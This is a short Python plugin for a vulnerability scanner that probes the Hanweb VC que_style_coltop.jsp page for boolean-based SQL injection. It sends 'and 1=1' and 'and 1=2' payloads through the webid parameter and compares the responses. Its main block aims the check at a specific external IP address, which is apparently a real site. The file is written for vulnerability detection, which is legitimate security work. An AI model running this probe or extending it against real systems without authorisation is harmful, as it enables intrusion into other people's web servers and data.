#!/usr/bin/env python
# -*- coding: utf-8 -*-
#__Author__ = 烽火戏诸侯
#_PlugName_ = 大汉 VC que_style_coltop.jsp SQL注入漏洞
import re

def assign(service, arg):
    if service == "hanweb":
        return True, arg

def audit(arg):
    for id in range(1,10):
        payload ='vc/vc/interface/index/que_style_coltop.jsp?webid=%s' % id
        target = arg + payload 
        code, head, res, errcode, _ = curl.curl2(target)
        if code == 200 and '没有数据' not in res:
            code1, head1, res1, errcode1, _1 = curl.curl2(target+'%20and%201=1') 
            code2, head2, res2, errcode2, _2 = curl.curl2(target+'%20and%201=2') 
            if code == code1==200 and res == res1: 
                if res1 != res2:
                    security_hole(target)
            break
        

if __name__ == '__main__':
    from dummy import *
    audit(assign('hanweb', 'http://218.94.101.3:88/')[1])